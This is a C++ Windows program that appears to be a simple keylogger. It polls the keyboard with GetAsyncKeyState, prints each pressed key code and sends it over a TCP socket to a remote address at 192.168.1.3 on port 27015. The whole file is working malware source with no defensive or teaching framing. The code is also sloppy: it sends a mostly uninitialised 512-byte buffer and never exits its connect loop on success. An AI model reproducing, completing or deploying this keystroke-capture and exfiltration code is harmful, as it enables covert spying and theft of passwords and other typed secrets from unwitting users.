#define WIN32_LEAN_AND_MEAN


#include<windows.h>
#include<WinSock2.h>
#include<WS2tcpip.h>
#include<iostream>
#include<fstream>
#include<chrono>
#include<thread>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


using namespace std;


int main(){
WSADATA data;
SOCKET mysock = INVALID_SOCKET;
HWND mywind = GetConsoleWindow();
addrinfo *ptr,*result,hint;
int iresult;

iresult = WSAStartup(MAKEWORD(2,2),&data);
if(iresult != 0 ){
    cout<<"error";
}
ZeroMemory(&hint,sizeof(hint));
hint.ai_family = AF_INET;
hint.ai_protocol = IPPROTO_TCP;
hint.ai_socktype = SOCK_STREAM;

iresult = getaddrinfo("192.168.1.3","27015",&hint,&result);
if(iresult != 0) cout<<"addr error";

for(ptr = result;ptr != NULL;ptr = ptr->ai_next){
    mysock = socket(ptr->ai_family,ptr->ai_socktype,ptr->ai_protocol);
    if(mysock == INVALID_SOCKET){
        cout<<"socketerror";
        WSACleanup();
    }

    iresult = connect(mysock,ptr->ai_addr,(int)ptr->ai_addrlen);


}
freeaddrinfo(result);

if (mysock == INVALID_SOCKET) {
    printf("Unable to connect to server!\n");
    WSACleanup();
    return 1;
}


char* mychar = new char[512];
    while(iresult != SOCKET_ERROR){
for(int i = 0;i<100;i++){
        if(GetAsyncKeyState(i)& 0x8000){
            *mychar = (char)i;
            cout<<*mychar;
            
            iresult = send(mysock,mychar,512,0);
        }
    
    
    
    
    }
  this_thread::sleep_for(70ms);
    }
}